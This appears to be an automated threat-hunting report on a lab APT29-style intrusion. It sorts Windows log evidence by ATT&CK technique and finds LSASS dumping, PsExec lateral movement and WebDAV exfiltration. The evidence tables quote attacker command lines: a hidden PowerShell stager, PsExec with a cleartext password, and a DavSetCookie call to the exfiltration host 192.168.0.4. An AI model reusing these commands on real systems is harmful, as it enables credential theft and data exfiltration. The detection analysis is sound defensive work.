| 2 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-e757529fe3 | ok |
| 3 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | user.name | pbeesly | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-e757529fe3 | ok |
| 4 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTkbEF9 | q-6aa0c1be52 | ok |
| 5 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTkbEF9 | q-6aa0c1be52 | ok |
| 6 | 2020-05-02 03:00:13.551Z | scranton.dmevals.local | windows.sysmon | win.ParentCommandLine | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTvoSAW | q-54ec843695 | ok |
| 7 | 2020-05-02 03:00:13.551Z | scranton.dmevals.local | windows.sysmon | win.IntegrityLevel | High | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTvoSAW | q-54ec843695 | ok |

### F56 · suspicious / medium · T1003.001 · PowerShell on scranton reads lsass.exe (0x10 access) — consistent with anchor LSASS dumping

Evidence status: **verified**

On scranton.dmevals.local, powershell.exe running as pbeesly was recorded accessing \Device\HarddiskVolume2\Windows\System32\lsass.exe with AccessMask 0x10 (PROCESS_VM_READ) at 03:05:16, corroborating the anchored LSASS credential-dumping activity on that host. Other lsass accesses in the window are from CollectGuestLogs.exe and MsMpEng.exe (benign).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.ObjectName | \Device\HarddiskVolume2\Windows\System32\lsass.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKBk | q-7c2ca18dc0 | ok |
| 2 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | process.executable | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKBk | q-7c2ca18dc0 | ok |

### F26 · suspicious / medium · T1555 · PowerShell opened LSASS with PROCESS_ALL_ACCESS on scranton (credential-store memory access)

Evidence status: **verified**

On scranton.dmevals.local, PowerShell.exe (PID 2976, running as SYSTEM) opened lsass.exe (PID 736) with GrantedAccess 0x1f3fff and 0x1fffff (PROCESS_ALL_ACCESS) at 2020-05-02T03:05:16Z. This is the access mask used to read LSASS memory where Windows Credential Manager / DPAPI secrets reside. The vast majority of the 326 LSASS-access events are benign 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION) from svchost.exe, Windows Defender and CollectGuestLogs.exe, making these two full-access PowerShell opens the rare outlier. No procdump/mimikatz/comsvcs command line was observed, so the dumping tool itself is not directly evidenced.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-c52e4cc4c7 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-c52e4cc4c7 | ok |
| 3 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-c52e4cc4c7 | ok |
| 4 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-c52e4cc4c7 | ok |
| 5 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | host.name | scranton.dmevals.local | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-a7488fb616 | ok |

### F37 · suspicious / medium · T1556 · Rare full-access LSASS reads by PowerShell.exe (credential-dumping pattern, not auth-process modification)

Evidence status: **verified**

On scranton.dmevals.local, PowerShell.exe (PID 2976) opened lsass.exe with GrantedAccess 0x1f3fff and 0x1fffff (full access) at 03:05:16, with call traces ending in UNKNOWN modules — a pattern typical of credential dumping rather than authentication-process modification. This is noted as suspicious activity on the host but does not constitute T1556 (no authentication process was modified).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-3d7668e856 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-3d7668e856 | ok |
| 3 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|UNKNOWN(000001996D252982) | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-c6fd7ab968 | ok |

### F03 · benign / medium · T1003.002 · No SAM/SECURITY hive dumping observed

Evidence status: **verified**

Checks for registry hive file access to SAM/SECURITY (Sysmon event 2), reg save commands (4688), and 4663 access to SAM/SECURITY objects returned no hits. No evidence of Security Account Manager dumping in this window.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:03:38.000Z | newyork.dmevals.local | windows.security | win.ObjectType | Process | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOqAA | q-928a3a303e | ok |

### F04 · benign / medium · T1003.003 · No NTDS.dit access or volume shadow copy activity observed

Evidence status: **verified**

Checks for ntds file creation/access (Sysmon 11/2), and 4688/4104 command lines referencing ntds, vssadmin, ntdsutil or diskshadow all returned zero hits. No Active Directory database theft observed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:27.395Z | nashua.dmevals.local | windows.sysmon | win.TargetFilename | C:\ProgramData\Microsoft\Windows\WER\Temp\WER51F5.tmp.dmp | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTiZblD | q-edb32adb7a | ok |

### F05 · benign / high · T1003.004 · LSA Secrets queries are benign LOCAL SERVICE machine-account reads

Evidence status: **verified**

Event 4662 shows LOCAL SERVICE (S-1-5-19) querying the LSA SecretObject Policy\Secrets\$MACHINE.ACC on nashua, scranton and utica. This is the routine machine-account secret read performed by the OS, not adversary LSA Secrets dumping. No 4663/4656 access to SECURITY\Policy\Secrets and no lsadump/secrets/cachedump script blocks were found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:02:59.000Z | nashua.dmevals.local | windows.security | message | An operation was performed on an object.    Subject :  	Security ID:		S-1-5-19  	Account Name:		LOCAL SERVICE  	Account Domain:		NT AUTHORITY  	Logon ID:		0x3E5… | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaEO1dd | q-8280838b9e | ok |

### F06 · benign / medium · T1003.005 · No cached domain credential access observed

Evidence status: **verified**

Checks for 4663/4656 access to SECURITY\Cache objects and PowerShell script blocks referencing cachedump/cache/dcc2 returned no hits. No evidence of cached domain credential theft.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:03:00.000Z | scranton.dmevals.local | windows.security | win.ObjectType | SecretObject | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaEO1dg | q-8280838b9e | ok |

### F07 · benign / medium · T1003.006 · No DCSync / directory replication abuse observed

Evidence status: **verified**

Checks for drsuapi/dcsync/lsadump in process command lines, PowerShell script blocks and windows.other messages returned no hits. The single 4662 DS object access was a machine account (NEWYORK$) Control Access operation, not a replication request. No DCSync activity observed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:16:15.000Z | newyork.dmevals.local | windows.security | user.name | NEWYORK$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ6CoYO | q-8280838b9e | ok |

### F08 · benign / high · T1040 · netsh packet capture on scranton.dmevals.local is Azure Network Watcher agent activity, not adversary sniffing

Evidence status: **verified**

The only packet-capture activity in the dataset is a single netsh trace capture on scranton.dmevals.local at 2020-05-02T03:19:17Z, run as NT AUTHORITY\SYSTEM by the Microsoft Azure NetworkWatcherAgent (C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe /service). It is part of a coherent Azure platform maintenance sequence on that host: the NetworkWatcherAgent service started at 03:19:13.877Z (parent services.exe), netsh 'trace start capture=yes' wrote an .etl to C:\windows\TEMP\E7116ECA-...\B91E06C5-....etl, netsh loaded the Windows capture helper hnetmon.dll, and netsh 'trace stop' ran at 03:19:24.835Z. In the same window the Azure guest agent (WaAppAgent.exe) drove logman trace create/start/stop cycles for GAEvents and RTEvents. No third-party sniffing tools (tcpdump/windump/wireshark/dumpcap/pktmon/rawcap) were observed, no pcap/npcap/winpcap driver loads were found, and no attacker-controlled process or user was involved. This is expected Azure Network Watcher diagnostic capture, not credential-access network sniffing.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:17.154Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\netsh.exe trace start capture=yes traceFile="C:\windows\TEMP\E7116ECA-DFE6-43C7-8FA8-8D3AC5AA8726\B91E06C5-1C7C-4830-9A76-74FA211560A7.etl" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPM8kte | q-47c5aa011a | ok |
| 2 | 2020-05-02 03:19:17.154Z | scranton.dmevals.local | windows.sysmon | process.parent.executable | C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPM8kte | q-ecd0303c8c | ok |
| 3 | 2020-05-02 03:19:17.000Z | scranton.dmevals.local | windows.security | win.SubjectUserName | SCRANTON$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVt4o2y | q-529f3f7d26 | ok |
| 4 | 2020-05-02 03:19:24.835Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\netsh.exe trace stop | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPE0PdZ | q-c5d2c37d51 | ok |
| 5 | 2020-05-02 03:19:17.353Z | scranton.dmevals.local | windows.sysmon | win.ImageLoaded | C:\Windows\System32\hnetmon.dll | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOuYQdN | q-5d0e3ddaa5 | ok |
| 6 | 2020-05-02 03:19:13.877Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe" /service | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9qRCx | q-41db6a264d | ok |
| 7 | 2020-05-02 03:19:41.076Z | scranton.dmevals.local | windows.sysmon | process.command_line | "logman.exe" create trace RTEvents -max 50 -f bincirc -o C:\WindowsAzure\Logs\RuntimeEvents.etl -pf C:\WindowsAzure\Packages\GuestAgent\ProviderGuids.txt | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOlQHBV | q-c5d2c37d51 | ok |

### F12 · benign / high · T1110 · No brute-force authentication activity; observed credential access is LSASS dumping, not guessing

Evidence status: **verified**

Across windows.security, windows.sysmon, windows.powershell and windows.other (2020-05-02 02:55-03:28Z) there is no evidence of brute-force authentication. All failed-logon queries returned zero hits: event.code:4625 (Windows logon failure) and event.code:4771 (Kerberos pre-auth failure) matched nothing. The only NTLM credential-validation event (4776) on newyork.dmevals.local for user pbeesly carries win.Status 0x0, i.e. a SUCCESS, not a failure. No cracking tooling (hashcat/john/crack) was executed and no wordlist/potfile/hash files were created. The credential-related activity that IS present on scranton.dmevals.local is credential theft (LSASS access, PFX export), which belongs to a different technique family, not T1110.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:40.000Z | newyork.dmevals.local | windows.security | win.Status | 0x0 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn1FNc | q-c920f410cb | ok |
| 2 | 2020-05-02 03:20:40.000Z | newyork.dmevals.local | windows.security | win.TargetUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn1FNc | q-c920f410cb | ok |
| 3 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-ac9dd48d26 | ok |

### F13 · benign / high · T1110.001 · No password-guessing activity observed

Evidence status: **verified**

No password guessing was found. Failed-logon events (4625) are entirely absent from windows.security, and no process was launched with password arguments for authentication attempts (the single sysmon event.code:1 hit with 'pass' in the command line is a PowerShell stager decoding a bitmap, not a logon attempt). The PowerShell script blocks that mention 'Password'/'Credential' are not guessing loops: Get-PrivateKeys uses a hardcoded string to export certificates, and Invoke-Exfil builds a PSCredential from a hardcoded password for a WebDAV copy. None of these attempt authentication against multiple candidate passwords.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-fdd0079597 | ok |
| 2 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB61zZ | q-7f8e66bdee | ok |

### F14 · benign / high · T1110.002 · No password-cracking preparation; LSASS access is credential dumping (different technique)

Evidence status: **verified**

No offline cracking activity was observed: no hashcat/john/crack processes, and the file-creation hits for *hash*/*.txt are ordinary OS artifacts (WER temp files, Cortana index files, Sysinternals readme/EULA text files, a Python _hashlib.pyd). The 326 sysmon event.code:10 accesses to lsass.exe are dominated by svchost.exe with GrantedAccess 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION, benign). However, on scranton.dmevals.local PowerShell.exe (PID 2976) opened lsass.exe with GrantedAccess 0x1f3fff and 0x1fffff at 03:05:16 - a full-access LSASS handle consistent with credential dumping (T1003), not with password cracking. SAM handle requests (4656, ObjectName 'SAM') all originate from lsass.exe running as SCRANTON$, i.e. normal OS behaviour.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-3eeeccd712 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-ac9dd48d26 | ok |
| 3 | 2020-05-02 03:19:21.000Z | scranton.dmevals.local | windows.security | win.ProcessName | C:\Windows\System32\lsass.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVr3Lv_ | q-6c8dbaec60 | ok |

### F15 · benign / high · T1110.003 · No password spraying; 4648 explicit-credential logons are PsExec lateral movement by one account

Evidence status: **verified**

No spraying was observed. Failed-logon (4625) and Kerberos pre-auth failure (4771) events are absent, so there is no pattern of one password tried against many accounts. The 15 explicit-credential logon events (4648) are not a spray: they involve the single account pbeesly, with 9 on scranton.dmevals.local (SubjectUserName pbeesly, IpAddress 10.0.1.6) and 6 on nashua.dmevals.local where the process is C:\Windows\PSEXESVC.exe (SubjectUserName NASHUA$), i.e. PsExec-driven lateral movement using one known credential rather than guessing across accounts. The remaining 4648 targets are machine/system accounts (DWM-1/2, UMFD-0/1/2, SCRANTON$).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | win.ProcessName | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev8p | q-06fb3d2753 | ok |
| 2 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | win.TargetUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev8p | q-06fb3d2753 | ok |
| 3 | 2020-05-02 03:11:18.000Z | scranton.dmevals.local | windows.security | win.IpAddress | 10.0.1.6 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev9J | q-06fb3d2753 | ok |

### F16 · benign / high · T1110.004 · No credential stuffing observed

Evidence status: **verified**

No credential-stuffing activity was found. There are no failed authentication events at all (4625 and 4771 both returned zero hits), which is a prerequisite for stuffing attempts. The only credential-validation event (4776) is a success (win.Status 0x0) for pbeesly on newyork.dmevals.local. No processes were launched with 'net use' or 'runas' carrying credential arguments, and no authentication attempts against multiple distinct accounts from a common source were seen.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:40.000Z | newyork.dmevals.local | windows.security | win.Status | 0x0 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn1FNc | q-c920f410cb | ok |
| 2 | 2020-05-02 03:20:40.000Z | newyork.dmevals.local | windows.security | win.Workstation | 10.0.1.4 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn1FNc | q-c920f410cb | ok |

### F17 · benign / medium · T1111 · No MFA interception artifacts; observed activity is credential use and token enumeration, not MFA theft

Evidence status: **verified**

Hunting for T1111 (Multi-Factor Authentication Interception) across windows.security, windows.sysmon, windows.powershell and windows.other on 2020-05-02 found no evidence of MFA interception. LSASS process-access (Sysmon EID 10) is dominated by C:\windows\system32\svchost.exe with GrantedAccess 0x1000 (286 events, read-only, consistent with Defender/AV) plus Azure antimalware/telemetry binaries; the only full-access (0x1fffff/0x1f3fff) handles are from Windows-native processes (csrss.exe, wininit.exe, PowerShell.exe, wsmprovhost.exe). No smartcard/OTP/token-theft tooling, no credential-provider or MFA registry tampering, and no PowerShell script blocks referencing MFA/OTP/smartcard/keylog were found. The notable activity is instead credential USE and token enumeration: on scranton.dmevals.local user pbeesly ran PsExec64.exe with cleartext credentials (-u dmevals\pbeesly -p Fl0nk3rt0n!T0by) to push C:\Windows\Temp\python.exe to NASHUA, which then beacons to 192.168.0.4:8443; and a PowerShell script block (Get-AttributesMask, from C:\Program Files\SysinternalsSuite\readme.ps1) enumerates Windows token/group attributes. These are credential-access-adjacent behaviours but do not constitute MFA interception.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:14:42.601Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPDyDoS | q-7d4c5976cd | ok |
| 2 | 2020-05-02 03:17:59.352Z | nashua.dmevals.local | windows.sysmon | destination.port | 8443 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO_tniJ | q-670425d815 | ok |
| 3 | 2020-05-02 03:24:18.178Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1000 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOYDnci | q-e9e0eb39f8 | ok |
| 4 | 2020-05-02 03:04:04.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRllBR | q-2d77ef31b4 | ok |
| 5 | 2020-05-02 03:11:39.000Z | nashua.dmevals.local | windows.other | message | A service was installed in the system.    Service Name:  PSEXESVC  Service File Name:  %SystemRoot%\PSEXESVC.exe  Service Type:  user mode service  Service Star… | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrYMQT | q-853f31b34b | ok |

### F19 · benign / high · T1187 · SMB/IPC$/SYSVOL access is normal machine-account domain activity

Evidence status: **verified**

The SMB share access and outbound SMB connections in the Windows datasets are all attributable to machine accounts (SYSTEM) performing routine domain/GPO operations: SYSVOL reads of dmevals.local Policies gpt.ini/GptTmpl.inf by NEWYORK$, SCRANTON$, NASHUA$, UTICA$; IPC$ samr access; and ADMIN$ access by pbeesly. Outbound 445 connections originate from System processes to domain hosts (10.0.0.4, 10.0.1.6, fe80::e40c:95b6:b0a7:6429). These are consistent with normal domain controller/GPO replication and management traffic, not forced-authentication coercion.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:43.000Z | newyork.dmevals.local | windows.security | win.ShareName | \\*\SYSVOL | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaFQQt- | q-62052803d6 | ok |
| 2 | 2020-05-02 03:01:43.000Z | newyork.dmevals.local | windows.security | win.SubjectUserName | SCRANTON$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaFQQt- | q-62052803d6 | ok |
| 3 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.ShareName | \\*\IPC$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKDB | q-62052803d6 | ok |
| 4 | 2020-05-02 03:01:43.033Z | scranton.dmevals.local | windows.sysmon | process.executable | System | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTqgghU | q-edc132ce7b | ok |
| 5 | 2020-05-02 03:01:43.033Z | scranton.dmevals.local | windows.sysmon | destination.ip | 10.0.0.4 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTqgghU | q-edc132ce7b | ok |

### F20 · benign / high · T1212 · No exploitation-for-credential-access activity; LSASS access is benign Azure/system tooling

Evidence status: **verified**

Across all four Windows hosts (scranton/newyork/nashua/utica.dmevals.local) in the 2020-05-02 window, no exploitation of a software vulnerability for credential access was observed. The 326 Sysmon process-access (event.code 10) events targeting C:\windows\system32\lsass.exe are dominated by legitimate Azure guest agents and system processes: svchost.exe with GrantedAccess 0x1000, C:\Packages\Plugins\Microsoft.Azure.Security.IaaSAntimalware\1.5.5.9\AntimalwareConfig.exe and C:\WindowsAzure\Packages\Telemetry\WindowsAzureTelemetryService.exe with 0x1400, plus wininit.exe (0x1fffff) and services.exe (0x1000) at boot. No credential-dumping tooling (mimikatz/sekurlsa/procdump/comsvcs/MiniDump) appears in any process command line, and the only lsass.exe process execution is lsass itself. Kerberos events (14x 4768, 28x 4769) are all successful (Status 0x0) normal TGT/TGS requests for pbeesly and machine accounts. The concurrent PowerShell activity (pbeesly: Invoke-Discovery, Invoke-Persistence, Invoke-ScreenCapture, Invoke-Exfil, Invoke-SeaDukeStage -ComputerName NASHUA, PsExec to NASHUA) is post-exploitation/lateral movement, not vulnerability exploitation for credential access.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:41.620Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\Packages\Plugins\Microsoft.Azure.Security.IaaSAntimalware\1.5.5.9\AntimalwareConfig.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOkOj38 | q-b4b2c8cd74 | ok |
| 2 | 2020-05-02 03:19:44.962Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\WindowsAzure\Packages\Telemetry\WindowsAzureTelemetryService.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOlP3A4 | q-b4b2c8cd74 | ok |
| 3 | 2020-05-02 03:24:18.178Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1000 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOYDnci | q-6cfe7dbd49 | ok |
| 4 | 2020-05-02 03:19:09.809Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9re0C | q-f535a175d0 | ok |
| 5 | 2020-05-02 03:20:46.000Z | newyork.dmevals.local | windows.security | win.Status | 0x0 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn01Pa | q-10f4602a7b | ok |
| 6 | 2020-05-02 03:10:22.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Invoke-SeaDukeStage -ComputerName NASHUA | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZJhF-L | q-302b1cd631 | ok |

### F21 · benign / high · T1539 · No browser session cookie theft observed; activity is WebDAV-based exfiltration

Evidence status: **verified**

Across windows.security, windows.sysmon, windows.powershell and windows.other (2020-05-02 02:55-03:28Z) there is no evidence of web session cookie theft. No process read or copied browser cookie stores (Cookies, Login Data, WebCache, session files): ES\|QL searches over Sysmon file-create (event.code 11) and Security object-access (event.code 4663) for cookie/login/session/webcache paths returned only OS and browser-internal artifacts (e.g. Edge RecoveryStore/DataStore temp files created by MicrosoftEdge.exe itself, and svchost INetCookies). The only 'cookie' hits are rundll32.exe davclnt.dll,DavSetCookie calls by user pbeesly on scranton.dmevals.local, which are WebDAV client cookie operations for the mapped \\192.168.0.4\webdav share used by the Invoke-Exfil PowerShell script (hunt.source_id apt29-powershell) - not browser session theft. The observed intrusion is credential/exfil activity (7-Zip archive OfficeSupplies.7z, WebDAV upload), not T1539.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:10:23.154Z | scranton.dmevals.local | windows.sysmon | process.command_line | rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVHe6C | q-6944599139 | ok |
| 2 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZCgBha | q-292d423dd3 | ok |
| 3 | 2020-05-02 03:08:35.270Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\AppData\Roaming\OfficeSupplies.7z | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTWI7pZ | q-720a04aeb8 | ok |
